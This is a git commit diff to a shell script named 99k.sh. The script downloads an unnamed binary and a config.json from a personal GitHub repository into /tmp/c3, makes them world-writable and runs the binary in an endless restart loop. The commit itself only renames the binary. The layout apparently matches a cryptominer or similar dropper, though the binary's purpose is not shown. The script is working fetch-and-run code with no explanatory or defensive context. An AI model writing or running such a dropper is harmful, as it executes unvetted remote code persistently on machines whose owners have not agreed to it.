877c1e35b80e945b797201b8203db79b1b773e2e
Blenkinship <151480121+Blenkinship@users.noreply.github.com>
2023-12-12 08:48:39 +0800

    Update 99k.sh

--- 99k.sh
+++ 99k.sh
@@ -8,11 +8,11 @@ mkdir -p /tmp/c3
 cd /tmp/c3
 ##wget https://raw.githubusercontent.com/Blenkinship/any/main/4v/config.json
 wget https://raw.githubusercontent.com/Blenkinship/any/main/32/config.json
-wget https://raw.githubusercontent.com/Blenkinship/any/main/000
+wget https://raw.githubusercontent.com/Blenkinship/any/main/0
 chmod -R  777 /tmp/c3
 #!/bin/sh
 while [ 1 ]; do
-	/tmp/c3/000 --config=/tmp/c3/config.json
+	/tmp/c3/0 --config=/tmp/c3/config.json
 	sleep 5
 done
 ##/tmp/c3/000 --config=/tmp/c3/config.json
